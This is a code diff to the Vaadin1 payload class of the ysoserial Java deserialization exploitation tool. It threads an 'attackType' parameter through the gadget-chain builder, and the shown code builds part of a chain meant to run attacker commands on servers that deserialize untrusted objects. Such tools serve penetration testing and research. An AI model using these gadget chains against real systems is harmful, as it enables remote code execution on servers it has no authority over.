@@ -18,6 +18,9 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.KULLRICH })
 public class Vaadin1 implements ObjectPayload<Object>
 {
+	
+	// federicodotta - All supported (TemplateImpl)
+	
 //  +-------------------------------------------------+
 //  |                                                 |
 //  |  BadAttributeValueExpException                  |
@@ -57,9 +60,9 @@ public class Vaadin1 implements ObjectPayload<Object>
 //                +------------------------------------------------+
     
     @Override
-    public Object getObject (String command) throws Exception
+    public Object getObject (String command, String attackType) throws Exception
     {
-        Object templ = Gadgets.createTemplatesImpl (command);
+        Object templ = Gadgets.createTemplatesImpl (command, attackType);
         PropertysetItem pItem = new PropertysetItem ();        
         
         NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object> (templ, "outputProperties");
